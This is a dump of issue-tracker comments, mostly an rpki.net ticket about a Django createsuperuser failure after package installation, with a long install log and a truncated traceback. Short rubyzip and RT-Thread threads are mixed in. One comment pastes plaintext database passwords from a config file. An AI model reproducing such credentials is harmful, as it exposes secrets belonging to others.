rpki.net/dragonresearch/198/238309988,"I cannot reproduce the createsuperuser failure.  Test sequence  Create new VM ""testy-tahir"", install 14.04 from ISO, install emacs.  Follow instructions [[wikidoc/RPKI/Installation/DebianPackages]] for trusty (apt-key, rpki.list, apt-get update, apt-get install).  Edit /etc/rpki.conf.  Only change needed was adding , to tell Django's cross-site-scripting protection to shut up and accept that name.  , as a check that GUI is up.  .  Asked me the usual questions, just worked, no exception.   Logs of most of this available, but they're pretty boring. So I don't know what you guys are doing wrong.  If I had to guess, I suspect you did not really start clean even though you say you did, eg, at some point you were using an rpki.conf from some other machine (with different SQL passwords) and did not clean up fully when you decided to back that out and try again, which left you with a mismatch between rpki.conf and the passwords in MySQL.  But that's just a guess. Trac comment by sra on 2015-08-06T145841Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309994,"polluted machine not likely, as we would destroy old vm, create new vm from a prototype that had never hear of rpki. though we did carry the rpki.conf around.  and it had that long auto- generated shared_sql_password {{{ shared_sql_password             = wOnoHHYNfhec7-Gm2SJ5e_PxBkniAjA6NNrlqq2LeDyXJsRbswlCJbOUPw4FAqnUdn9THR-4x0nagTbdtoG-1X4C shared_sql_password             = di2lbEw51 }}} but we dug ourselves out of this one.  so it is no longer blocking. Trac comment by randy on 2015-08-06T150618Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238309999,"Attempting to create the database when it already exists is supposed to fail by default, to prevent you from blowing away your precious existing data by mistake. There are options to change the default behavior,  for details. Trac comment by sra on 2015-08-06T151420Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238310003,"Nope.  Just the config file, and whatever MySQL believes at the moment. ♠rpki-sql-setup --fix-grants` may be useful if you want to force MySQL to believe whatever you have in the config file today. Trac comment by sra on 2015-08-06T151633Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238310010,"actually,  does not tell the whole story.  we looked at the code and tried --drop-and-create.  no love. Trac comment by randy on 2015-08-06T151905Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238310013,"OBE, all of this code was rewritten in tk705 Trac comment by sra on 2016-08-05T162059Z ",False,True,False,rpki.net/dragonresearch/198
rpki.net/dragonresearch/198/238310021,Closed with resolution worksforme ,False,True,False,rpki.net/dragonresearch/198
rt-thread/RT-Thread/2363/466247893," 我理解你这里的回调 URC 中带的数据是用来解析接收数据的信息的命令，比如 esp8266 中 服务器向模块发送10 bytes 数据格式如下：  这里 URC 回调中需要解析的就是 “+IPD1,10” 数据，读取接收的 socket 为 1 和数据的长度为 10，然后再在回调中调用  函数，直接从串口中读取 10 bytes 数据，这是整个接收数据的流程。所以 ESP8266 中 URC 处理函数如下： 这样只要在 URC 回调函数中处理好数据接收应该不会出现数据丢失的问题。  AT+CGREG? 函数一般在初始化的时候调用，一般在 URC 没初始化之前就调用，之后的 +CGREG：应该只会由 URC 处理  ",False,True,False,rt-thread/RT-Thread/2363
rubyzip/rubyzip/307/191656841,"Scenario I have a function that downloads the zipped code from aws s3-bucket. Extracts the zip file in a temp folder and then modifies few files from the extracted zip file and create a zip after modification. Later when I try to delete the temp folder it throws me ""The process cannot access the file because it is being used by another process."" (NOTE everything takes place in the same process meaning in the same function). After carefully looking the code found in the below code  def writeEntries(entries, path, io) entries.each { |e|   zipFilePath = path == """" ? e  File.join(path, e)   diskFilePath = File.join(@friend, zipFilePath)   puts ""Deflating "" + diskFilePath   if  File.directory?(diskFilePath)     io.mkdir(zipFilePath)     subdir =Dir.entries(diskFilePath); subdir.delete("".""); subdir.delete("".."")     writeEntries(subdir, zipFilePath, io)   else     io.get_output_stream(zipFilePath) { |f| f.puts(File.open(diskFilePath, ""rb"").read())}   end }  end In line  io.get_output_stream(zipFilePath) { |f| f.puts(File.open(diskFilePath, ""rb"").read())}, the file is opened but not closed. Solution   So I modified the above line of code as follows disk_file = File.open(diskFilePath, ""rb"") io.get_output_stream(zipFilePath) { |f|             f.puts(file_disk.read())         }  file_disk.close and was successfully able to delete the temp folder.  Would be great if the modification can be included in the file. Thanks, Zaid ",False,True,False,rubyzip/rubyzip/307
rubyzip/rubyzip/307/340184806,Glorious. ,False,True,False,rubyzip/rubyzip/307
rpki.net/dragonresearch/198/169979018,"fresh vm (ubuntu 14.4 i386) {{{ rpki.dfw.rg.net/root# apt-get install rpki-rp rpki-ca Reading package lists... Done Building dependency tree Reading state information... Done The following extra packages will be installed   apache2 apache2-bin apache2-data fontconfig fontconfig-config   fonts-dejavu-core libaio1 libapache2-mod-wsgi libapr1 libaprutil1   libaprutil1-dbd-sqlite3 libaprutil1-ldap libcairo2 libdatrie1   libdbd-mysql-perl libdbi-perl libfile-copy-recursive-perl libfontconfig1   libgraphite2-3 libharfbuzz0b libpango-1.0-0 libpangocairo-1.0-0   libpangoft2-1.0-0 libpixman-1-0 librrd4 libterm-readkey-perl libthai-data   libthai0 libxcb-render0 libxcb-shm0 libxml2-utils libxrender1 libxslt1.1   libyaml-0-2 mysql-client mysql-client-5.5 mysql-client-core-5.5 mysql-server   mysql-server-5.5 mysql-server-core-5.5 python-dateutil python-django   python-django-south python-lxml python-mysqldb python-netifaces   python-vobject python-yaml rrdtool ssl-cert update-inetd xinetd xsltproc Suggested packages   apache2-doc apache2-suexec-pristine apache2-suexec-custom apache2-utils   libclone-perl libmldbm-perl libnet-daemon-perl libplrpc-perl   libsql-statement-perl ttf-baekmuk ttf-arphic-gbsn00lp ttf-arphic-bsmi00lp   ttf-arphic-gkai00mp ttf-arphic-bkai00mp tinyca python-psycopg2   python-psycopg python-flup python-sqlite geoip-database-contrib gettext   python-django-doc ipython bpython libgdal1 python-lxml-dbg   python-egenix-mxdatetime python-mysqldb-dbg librrds-perl openssl-blacklist Recommended packages   ttf-dejavu ttf-bitstream-vera libhtml-template-perl libjs-jquery The following NEW packages will be installed   apache2 apache2-bin apache2-data fontconfig fontconfig-config   fonts-dejavu-core libaio1 libapache2-mod-wsgi libapr1 libaprutil1   libaprutil1-dbd-sqlite3 libaprutil1-ldap libcairo2 libdatrie1   libdbd-mysql-perl libdbi-perl libfile-copy-recursive-perl libfontconfig1   libgraphite2-3 libharfbuzz0b libpango-1.0-0 libpangocairo-1.0-0   libpangoft2-1.0-0 libpixman-1-0 librrd4 libterm-readkey-perl libthai-data   libthai0 libxcb-render0 libxcb-shm0 libxml2-utils libxrender1 libxslt1.1   libyaml-0-2 mysql-client mysql-client-5.5 mysql-client-core-5.5 mysql-server   mysql-server-5.5 mysql-server-core-5.5 python-dateutil python-django   python-django-south python-lxml python-mysqldb python-netifaces   python-vobject python-yaml rpki-ca rpki-rp rrdtool ssl-cert update-inetd   xinetd xsltproc 0 to upgrade, 55 to newly install, 0 to remove and 7 not to upgrade. Need to get 17.9 MB of archives. After this operation, 145 MB of additional disk space will be used. Do you want to continue? [Y/n]  Get1  trusty/main python-django-south all 1.0-0.1 [107 kB] Get2  trusty/main libaio1 i386 0.3.109-4 [6,578 B] Get3  trusty/main libapr1 i386 1.5.0-1 [88.8 kB] Get4  trusty/main libaprutil1 i386 1.5.3-1 [76.6 kB] Get5  trusty/main fonts-dejavu-core all 2.34-1ubuntu1 [1,024 kB] Get6  trusty/main rpki-rp i386 0.6088~trusty [1,015 kB] Get7  trusty-updates/main fontconfig-config all 2.11.0-0ubuntu4.1 [47.4 kB] Get8  trusty-updates/main libfontconfig1 i386 2.11.0-0ubuntu4.1 [124 kB] Get9  trusty/main libpixman-1-0 i386 0.30.2-2ubuntu1 [216 kB] Get10  trusty/main libxcb-render0 i386 1.10-2ubuntu1 [11.9 kB] Get11  trusty/main libxcb-shm0 i386 1.10-2ubuntu1 [5,622 B] Get12  trusty-updates/main libxrender1 i386 10.9.8-1build0.14.04.1 [17.5 kB] Get13  trusty-updates/main libcairo2 i386 1.13.0~20140204-0ubuntu1.1 [550 kB] Get14  trusty/main rpki-ca i386 0.6088~trusty [105 kB] Get15  trusty/main libdatrie1 i386 0.2.8-1 [17.3 kB] Get16  trusty/main libgraphite2-3 i386 1.2.4-1ubuntu1 [54.4 kB] Get17  trusty-updates/main libharfbuzz0b i386 0.9.27-1ubuntu1 [125 kB] Get18  trusty/main libthai-data all 0.1.20-3 [130 kB] Get19  trusty/main libthai0 i386 0.1.20-3 [17.1 kB] Get20  trusty-updates/main fontconfig i386 2.11.0-0ubuntu4.1 [175 kB] Get21  trusty-updates/main libpango-1.0-0 i386 1.36.3-1ubuntu1.1 [148 kB] Get22  trusty-updates/main libpangoft2-1.0-0 i386 1.36.3-1ubuntu1.1 [32.6 kB] Get23  trusty-updates/main libpangocairo-1.0-0 i386 1.36.3-1ubuntu1.1 [20.0 kB] Get24  trusty/main libxslt1.1 i386 1.1.28-2build1 [140 kB] Get25  trusty-updates/main libyaml-0-2 i386 0.1.4-3ubuntu3.1 [46.3 kB] Get26  trusty/main libdbi-perl i386 1.630-1 [881 kB] Get27  trusty/main libdbd-mysql-perl i386 4.025-1 [99.6 kB] Get28  trusty/main libterm-readkey-perl i386 2.31-1 [27.2 kB] Get29  trusty-updates/main mysql-client-core-5.5 i386 5.5.44-0ubuntu0.14.04.1 [701 kB] Get30  trusty-updates/main mysql-client-5.5 i386 5.5.44-0ubuntu0.14.04.1 [1,557 kB] Get31  trusty-updates/main mysql-server-core-5.5 i386 5.5.44-0ubuntu0.14.04.1 [3,481 kB] Get32  trusty-updates/main mysql-server-5.5 i386 5.5.44-0ubuntu0.14.04.1 [1,962 kB] Get33  trusty/main libaprutil1-dbd-sqlite3 i386 1.5.3-1 [10.3 kB] Get34  trusty/main libaprutil1-ldap i386 1.5.3-1 [8,552 B] Get35  trusty-updates/main apache2-bin i386 2.4.7-1ubuntu4.5 [825 kB] Get36  trusty-updates/main apache2-data all 2.4.7-1ubuntu4.5 [159 kB] Get37  trusty-updates/main apache2 i386 2.4.7-1ubuntu4.5 [87.6 kB] Get38  trusty-updates/main libapache2-mod-wsgi i386 3.4-4ubuntu2.1.14.04.2 [65.6 kB] Get39  trusty/main libfile-copy-recursive-perl all 0.38-1 [20.6 kB] Get40  trusty/main librrd4 i386 1.4.7-2ubuntu5 [128 kB] Get41  trusty-updates/main libxml2-utils i386 2.9.1+dfsg1-3ubuntu4.4 [33.5 kB] Get42  trusty-updates/main mysql-client all 5.5.44-0ubuntu0.14.04.1 [12.1 kB] Get43  trusty-updates/main mysql-server all 5.5.44-0ubuntu0.14.04.1 [12.2 kB] Get44  trusty/main python-dateutil all 1.5+dfsg-1ubuntu1 [48.9 kB] Get45  trusty-updates/main python-django all 1.6.1-2ubuntu0.9 [2,211 kB] Get46  trusty-updates/main python-lxml i386 3.3.3-1ubuntu0.1 [583 kB] Get47  trusty/main python-mysqldb i386 1.2.3-2ubuntu1 [54.6 kB] Get48  trusty/main python-netifaces i386 0.8-3build1 [11.2 kB] Get49  trusty/universe python-vobject all 0.8.1c-4ubuntu1 [47.9 kB] Get50  trusty-updates/main python-yaml i386 3.10-4ubuntu0.1 [96.9 kB] Get51  trusty/main ssl-cert all 1.0.33 [16.6 kB] Get52  trusty/main update-inetd all 4.43 [19.2 kB] Get53  trusty/main xsltproc i386 1.1.28-2build1 [13.2 kB] Get54  trusty/main rrdtool i386 1.4.7-2ubuntu5 [330 kB] Get55  trusty/main xinetd i386 12.3.15-3ubuntu1 [102 kB] Fetched 17.9 MB in 14s (1,225 kB/s) Extract templates from packages 100% Preconfiguring packages ... Selecting previously unselected package libaio1i386. (Reading database ... 89537 files and directories currently installed.) Preparing to unpack .../libaio1_0.3.109-4_i386.deb ... Unpacking libaio1i386 (0.3.109-4) ... Selecting previously unselected package libapr1i386. Preparing to unpack .../libapr1_1.5.0-1_i386.deb ... Unpacking libapr1i386 (1.5.0-1) ... Selecting previously unselected package libaprutil1i386. Preparing to unpack .../libaprutil1_1.5.3-1_i386.deb ... Unpacking libaprutil1i386 (1.5.3-1) ... Selecting previously unselected package fonts-dejavu-core. Preparing to unpack .../fonts-dejavu-core_2.34-1ubuntu1_all.deb ... Unpacking fonts-dejavu-core (2.34-1ubuntu1) ... Selecting previously unselected package fontconfig-config. Preparing to unpack .../fontconfig-config_2.11.0-0ubuntu4.1_all.deb ... Unpacking fontconfig-config (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libfontconfig1i386. Preparing to unpack .../libfontconfig1_2.11.0-0ubuntu4.1_i386.deb ... Unpacking libfontconfig1i386 (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libpixman-1-0i386. Preparing to unpack .../libpixman-1-0_0.30.2-2ubuntu1_i386.deb ... Unpacking libpixman-1-0i386 (0.30.2-2ubuntu1) ... Selecting previously unselected package libxcb-render0i386. Preparing to unpack .../libxcb-render0_1.10-2ubuntu1_i386.deb ... Unpacking libxcb-render0i386 (1.10-2ubuntu1) ... Selecting previously unselected package libxcb-shm0i386. Preparing to unpack .../libxcb-shm0_1.10-2ubuntu1_i386.deb ... Unpacking libxcb-shm0i386 (1.10-2ubuntu1) ... Selecting previously unselected package libxrender1i386. Preparing to unpack .../libxrender1_1%3a0.9.8-1build0.14.04.1_i386.deb ... Unpacking libxrender1i386 (10.9.8-1build0.14.04.1) ... Selecting previously unselected package libcairo2i386. Preparing to unpack .../libcairo2_1.13.0~20140204-0ubuntu1.1_i386.deb ... Unpacking libcairo2i386 (1.13.0~20140204-0ubuntu1.1) ... Selecting previously unselected package libdatrie1i386. Preparing to unpack .../libdatrie1_0.2.8-1_i386.deb ... Unpacking libdatrie1i386 (0.2.8-1) ... Selecting previously unselected package libgraphite2-3i386. Preparing to unpack .../libgraphite2-3_1.2.4-1ubuntu1_i386.deb ... Unpacking libgraphite2-3i386 (1.2.4-1ubuntu1) ... Selecting previously unselected package libharfbuzz0bi386. Preparing to unpack .../libharfbuzz0b_0.9.27-1ubuntu1_i386.deb ... Unpacking libharfbuzz0bi386 (0.9.27-1ubuntu1) ... Selecting previously unselected package libthai-data. Preparing to unpack .../libthai-data_0.1.20-3_all.deb ... Unpacking libthai-data (0.1.20-3) ... Selecting previously unselected package libthai0i386. Preparing to unpack .../libthai0_0.1.20-3_i386.deb ... Unpacking libthai0i386 (0.1.20-3) ... Selecting previously unselected package fontconfig. Preparing to unpack .../fontconfig_2.11.0-0ubuntu4.1_i386.deb ... Unpacking fontconfig (2.11.0-0ubuntu4.1) ... Selecting previously unselected package libpango-1.0-0i386. Preparing to unpack .../libpango-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpango-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libpangoft2-1.0-0i386. Preparing to unpack .../libpangoft2-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpangoft2-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libpangocairo-1.0-0i386. Preparing to unpack .../libpangocairo-1.0-0_1.36.3-1ubuntu1.1_i386.deb ... Unpacking libpangocairo-1.0-0i386 (1.36.3-1ubuntu1.1) ... Selecting previously unselected package libxslt1.1i386. Preparing to unpack .../libxslt1.1_1.1.28-2build1_i386.deb ... Unpacking libxslt1.1i386 (1.1.28-2build1) ... Selecting previously unselected package libyaml-0-2i386. Preparing to unpack .../libyaml-0-2_0.1.4-3ubuntu3.1_i386.deb ... Unpacking libyaml-0-2i386 (0.1.4-3ubuntu3.1) ... Selecting previously unselected package libdbi-perl. Preparing to unpack .../libdbi-perl_1.630-1_i386.deb ... Unpacking libdbi-perl (1.630-1) ... Selecting previously unselected package libdbd-mysql-perl. Preparing to unpack .../libdbd-mysql-perl_4.025-1_i386.deb ... Unpacking libdbd-mysql-perl (4.025-1) ... Selecting previously unselected package libterm-readkey-perl. Preparing to unpack .../libterm-readkey-perl_2.31-1_i386.deb ... Unpacking libterm-readkey-perl (2.31-1) ... Selecting previously unselected package mysql-client-core-5.5. Preparing to unpack .../mysql-client-core-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-client-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-client-5.5. Preparing to unpack .../mysql-client-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-client-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server-core-5.5. Preparing to unpack .../mysql-server-core-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-server-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server-5.5. Preparing to unpack .../mysql-server-5.5_5.5.44-0ubuntu0.14.04.1_i386.deb ... Unpacking mysql-server-5.5 (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package libaprutil1-dbd-sqlite3i386. Preparing to unpack .../libaprutil1-dbd-sqlite3_1.5.3-1_i386.deb ... Unpacking libaprutil1-dbd-sqlite3i386 (1.5.3-1) ... Selecting previously unselected package libaprutil1-ldapi386. Preparing to unpack .../libaprutil1-ldap_1.5.3-1_i386.deb ... Unpacking libaprutil1-ldapi386 (1.5.3-1) ... Selecting previously unselected package apache2-bin. Preparing to unpack .../apache2-bin_2.4.7-1ubuntu4.5_i386.deb ... Unpacking apache2-bin (2.4.7-1ubuntu4.5) ... Selecting previously unselected package apache2-data. Preparing to unpack .../apache2-data_2.4.7-1ubuntu4.5_all.deb ... Unpacking apache2-data (2.4.7-1ubuntu4.5) ... Selecting previously unselected package apache2. Preparing to unpack .../apache2_2.4.7-1ubuntu4.5_i386.deb ... Unpacking apache2 (2.4.7-1ubuntu4.5) ... Selecting previously unselected package libapache2-mod-wsgi. Preparing to unpack .../libapache2-mod-wsgi_3.4-4ubuntu2.1.14.04.2_i386.deb ... Unpacking libapache2-mod-wsgi (3.4-4ubuntu2.1.14.04.2) ... Selecting previously unselected package libfile-copy-recursive-perl. Preparing to unpack .../libfile-copy-recursive-perl_0.38-1_all.deb ... Unpacking libfile-copy-recursive-perl (0.38-1) ... Selecting previously unselected package librrd4. Preparing to unpack .../librrd4_1.4.7-2ubuntu5_i386.deb ... Unpacking librrd4 (1.4.7-2ubuntu5) ... Selecting previously unselected package libxml2-utils. Preparing to unpack .../libxml2-utils_2.9.1+dfsg1-3ubuntu4.4_i386.deb ... Unpacking libxml2-utils (2.9.1+dfsg1-3ubuntu4.4) ... Selecting previously unselected package mysql-client. Preparing to unpack .../mysql-client_5.5.44-0ubuntu0.14.04.1_all.deb ... Unpacking mysql-client (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package mysql-server. Preparing to unpack .../mysql-server_5.5.44-0ubuntu0.14.04.1_all.deb ... Unpacking mysql-server (5.5.44-0ubuntu0.14.04.1) ... Selecting previously unselected package python-dateutil. Preparing to unpack .../python-dateutil_1.5+dfsg-1ubuntu1_all.deb ... Unpacking python-dateutil (1.5+dfsg-1ubuntu1) ... Selecting previously unselected package python-django. Preparing to unpack .../python-django_1.6.1-2ubuntu0.9_all.deb ... Unpacking python-django (1.6.1-2ubuntu0.9) ... Selecting previously unselected package python-django-south. Preparing to unpack .../python-django-south_1.0-0.1_all.deb ... Unpacking python-django-south (1.0-0.1) ... Selecting previously unselected package python-lxml. Preparing to unpack .../python-lxml_3.3.3-1ubuntu0.1_i386.deb ... Unpacking python-lxml (3.3.3-1ubuntu0.1) ... Selecting previously unselected package python-mysqldb. Preparing to unpack .../python-mysqldb_1.2.3-2ubuntu1_i386.deb ... Unpacking python-mysqldb (1.2.3-2ubuntu1) ... Selecting previously unselected package python-netifaces. Preparing to unpack .../python-netifaces_0.8-3build1_i386.deb ... Unpacking python-netifaces (0.8-3build1) ... Selecting previously unselected package python-vobject. Preparing to unpack .../python-vobject_0.8.1c-4ubuntu1_all.deb ... Unpacking python-vobject (0.8.1c-4ubuntu1) ... Selecting previously unselected package python-yaml. Preparing to unpack .../python-yaml_3.10-4ubuntu0.1_i386.deb ... Unpacking python-yaml (3.10-4ubuntu0.1) ... Selecting previously unselected package ssl-cert. Preparing to unpack .../ssl-cert_1.0.33_all.deb ... Unpacking ssl-cert (1.0.33) ... Selecting previously unselected package update-inetd. Preparing to unpack .../update-inetd_4.43_all.deb ... Unpacking update-inetd (4.43) ... Selecting previously unselected package xsltproc. Preparing to unpack .../xsltproc_1.1.28-2build1_i386.deb ... Unpacking xsltproc (1.1.28-2build1) ... Selecting previously unselected package rrdtool. Preparing to unpack .../rrdtool_1.4.7-2ubuntu5_i386.deb ... Unpacking rrdtool (1.4.7-2ubuntu5) ... Selecting previously unselected package xinetd. Preparing to unpack .../xinetd_1%3a2.3.15-3ubuntu1_i386.deb ... Unpacking xinetd (12.3.15-3ubuntu1) ... Selecting previously unselected package rpki-rp. Preparing to unpack .../rpki-rp_0.6088~trusty_i386.deb ... Unpacking rpki-rp (0.6088~trusty) ... Selecting previously unselected package rpki-ca. Preparing to unpack .../rpki-ca_0.6088~trusty_i386.deb ... Unpacking rpki-ca (0.6088~trusty) ... Processing triggers for man-db (2.6.7.1-1ubuntu1) ... Processing triggers for ureadahead (0.100.0-16) ... ureadahead will be reprofiled on next reboot Processing triggers for ufw (0.34~rc-0ubuntu2) ... Setting up libaio1i386 (0.3.109-4) ... Setting up libapr1i386 (1.5.0-1) ... Setting up libaprutil1i386 (1.5.3-1) ... Setting up fonts-dejavu-core (2.34-1ubuntu1) ... Setting up fontconfig-config (2.11.0-0ubuntu4.1) ... Setting up libfontconfig1i386 (2.11.0-0ubuntu4.1) ... Setting up libpixman-1-0i386 (0.30.2-2ubuntu1) ... Setting up libxcb-render0i386 (1.10-2ubuntu1) ... Setting up libxcb-shm0i386 (1.10-2ubuntu1) ... Setting up libxrender1i386 (10.9.8-1build0.14.04.1) ... Setting up libcairo2i386 (1.13.0~20140204-0ubuntu1.1) ... Setting up libdatrie1i386 (0.2.8-1) ... Setting up libgraphite2-3i386 (1.2.4-1ubuntu1) ... Setting up libharfbuzz0bi386 (0.9.27-1ubuntu1) ... Setting up libthai-data (0.1.20-3) ... Setting up libthai0i386 (0.1.20-3) ... Setting up fontconfig (2.11.0-0ubuntu4.1) ... Regenerating fonts cache... done. Setting up libpango-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libpangoft2-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libpangocairo-1.0-0i386 (1.36.3-1ubuntu1.1) ... Setting up libxslt1.1i386 (1.1.28-2build1) ... Setting up libyaml-0-2i386 (0.1.4-3ubuntu3.1) ... Setting up libdbi-perl (1.630-1) ... Setting up libdbd-mysql-perl (4.025-1) ... Setting up libterm-readkey-perl (2.31-1) ... Setting up mysql-client-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-client-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-server-core-5.5 (5.5.44-0ubuntu0.14.04.1) ... Setting up mysql-server-5.5 (5.5.44-0ubuntu0.14.04.1) ... 150806  54218 [Warning] Using unique option prefix key_buffer instead of key_buffer_size is deprecated and will be removed in a future release. Please use the full name instead. 150806  54218 [Note] /usr/sbin/mysqld (mysqld 5.5.44-0ubuntu0.14.04.1) starting as process 3444 ... mysql start/running, process 3576 Setting up libaprutil1-dbd-sqlite3i386 (1.5.3-1) ... Setting up libaprutil1-ldapi386 (1.5.3-1) ... Setting up apache2-bin (2.4.7-1ubuntu4.5) ... Setting up apache2-data (2.4.7-1ubuntu4.5) ... Setting up apache2 (2.4.7-1ubuntu4.5) ... Enabling module mpm_event. Enabling module authz_core. Enabling module authz_host. Enabling module authn_core. Enabling module auth_basic. Enabling module access_compat. Enabling module authn_file. Enabling module authz_user. Enabling module alias. Enabling module dir. Enabling module autoindex. Enabling module env. Enabling module mime. Enabling module negotiation. Enabling module setenvif. Enabling module filter. Enabling module deflate. Enabling module status. Enabling conf charset. Enabling conf localized-error-pages. Enabling conf other-vhosts-access-log. Enabling conf security. Enabling conf serve-cgi-bin. Enabling site 000-default.  Starting web server apache2                                                   *  Setting up libapache2-mod-wsgi (3.4-4ubuntu2.1.14.04.2) ... apache2_invoke Enable module wsgi Restarting web server apache2                                         [ OK ]  Setting up libfile-copy-recursive-perl (0.38-1) ... Setting up librrd4 (1.4.7-2ubuntu5) ... Setting up libxml2-utils (2.9.1+dfsg1-3ubuntu4.4) ... Setting up mysql-client (5.5.44-0ubuntu0.14.04.1) ... Setting up python-dateutil (1.5+dfsg-1ubuntu1) ... Setting up python-django (1.6.1-2ubuntu0.9) ... Setting up python-django-south (1.0-0.1) ... Setting up python-lxml (3.3.3-1ubuntu0.1) ... Setting up python-mysqldb (1.2.3-2ubuntu1) ... Setting up python-netifaces (0.8-3build1) ... Setting up python-vobject (0.8.1c-4ubuntu1) ... Setting up python-yaml (3.10-4ubuntu0.1) ... Setting up ssl-cert (1.0.33) ... Setting up update-inetd (4.43) ... Setting up xsltproc (1.1.28-2build1) ... Setting up rrdtool (1.4.7-2ubuntu5) ... Setting up xinetd (12.3.15-3ubuntu1) ... xinetd start/running, process 4472 Processing triggers for ureadahead (0.100.0-16) ... Setting up mysql-server (5.5.44-0ubuntu0.14.04.1) ... Processing triggers for ufw (0.34~rc-0ubuntu2) ... Setting up rpki-rp (0.6088~trusty) ... Setting up rpki-ca (0.6088~trusty) ... RPKI Apache configuration platform ""Ubuntu"", action ""install"" Writing /etc/rpki/apache.conf.sample Would have removed /etc/rpki/apache.conf if it existed Writing /etc/rpki/apache.conf Would have removed /etc/apache2/sites-available/rpki.conf if it existed Symlinking /etc/apache2/sites-available/rpki.conf to /etc/rpki/apache.conf Would have removed /etc/rpki/apache.cer if it existed Would have removed /etc/rpki/apache.key if it existed Running a2enmod ssl Considering dependency setenvif for ssl Module setenvif already enabled Considering dependency mime for ssl Module mime already enabled Considering dependency socache_shmcb for ssl Enabling module socache_shmcb. Enabling module ssl. See /usr/share/doc/apache2/README.Debian.gz on how to configure SSL and create self-signed certificates. To activate the new configuration, you need to run service apache2 restart Running a2ensite rpki Enabling site rpki. To activate the new configuration, you need to run service apache2 reload Running a2dismod deflate Module deflate disabled. To activate the new configuration, you need to run service apache2 restart Running service apache2 restart Restarting web server apache2                                                AH00548 NameVirtualHost has no effect and will be removed in the next release /etc/apache2/sites-enabled/rpki.conf5                                                                  [ OK ]  # Current version of rpkid is 0.6088 Writing /usr/share/rpki/ca.cer Writing /usr/share/rpki/rpkid.key Writing /usr/share/rpki/rpkid.cer Writing /usr/share/rpki/irdbd.cer Writing /usr/share/rpki/irbe.cer Writing /usr/share/rpki/pubd.key Writing /usr/share/rpki/pubd.cer Syncing... Creating tables ... Creating table auth_permission Creating table auth_group_permissions Creating table auth_group Creating table auth_user_groups Creating table auth_user_user_permissions Creating table auth_user Creating table django_content_type Creating table django_session Creating table cacheview_addressrange Creating table cacheview_addressrangev6 Creating table cacheview_asrange Creating table cacheview_validationlabel Creating table cacheview_repositoryobject Creating table cacheview_validationstatus Creating table cacheview_signedobject Creating table cacheview_cert_addresses Creating table cacheview_cert_asns Creating table cacheview_cert_addresses_v6 Creating table cacheview_cert Creating table cacheview_roaprefixv4 Creating table cacheview_roaprefixv6 Creating table cacheview_roa_prefixes_v6 Creating table cacheview_roa_prefixes Creating table cacheview_roa Creating table cacheview_ghostbuster Creating table routeview_routeorigin Creating table routeview_routeoriginv6 Creating table south_migrationhistory Installing custom SQL ... Installing indexes ... Installed 0 object(s) from 0 fixture(s)  Synced django.contrib.auth django.contrib.contenttypes django.contrib.sessions django.contrib.staticfiles rpki.irdb rpki.gui.cacheview rpki.gui.routeview south }}}  gui does put up the login page, see  to create superuser {{{ rpki.dfw.rg.net/root# rpki-manage createsuperuser Traceback (most recent call last)   File ""/usr/sbin/rpki-manage"", line 13, in &lt;module&gt;     execute_from_command_line()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 399, in execute_from_command_line     utility.execute()   File ""/usr/lib/python2.7/dist-packages/django/core/management/init.py"", line 392, in execute     self.fetch_command(subcommand).run_from_argv(self.argv)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 242, in run_from_argv     self.execute(args, **options.dict)   File ""/usr/lib/python2.7/dist-packages/django/core/management/base.py"", line 285, in execute     output = self.handle(args, options)   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/commands/createsuperuser.py"", line 80, in handle     default_username = get_default_username()   File ""/usr/lib/python2.7/dist-packages/django/contrib/auth/management/init.py"", line 183, in get_default_username     auth_app.User._default_manager.get(username=default_username)   File ""/usr/lib/python2.7/dist-packages/django/db/models/manager.py"", line 151, in get     return self.get_queryset().get(*args, kwargs)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 301, in get     num = len(clone)   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 77, in len     self._fetch_all()   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 854, in _fetch_all     self._result_cache = list(self.iterator())   File ""/usr/lib/python2.7/dist-packages/django/db/models/query.py"", line 220, in iterator     for row in compiler.results_iter()   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 710, in results_iter     for rows in self.execute_sql(MULTI)   File ""/usr/lib/python2.7/dist-packages/django/db/models/sql/compiler.py"", line 780, in execute_sql     cursor = self.connection.cursor()   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 159, in cursor     cursor = util.CursorWrapper(self._cursor(), self)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 129, in _cursor     self.ensure_connection()   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 124, in ensure_connection     self.connect()   File ""/usr/lib/python2.7/dist-packages/django/db/utils.py"", line 99, in exit     six.reraise(dj_exc_type, dj_exc_value, traceback)   File ""/usr/lib/python2.7/dist-packages/django/db/backends/init.py"", line 124, in ensure_connection     self.connect()   File 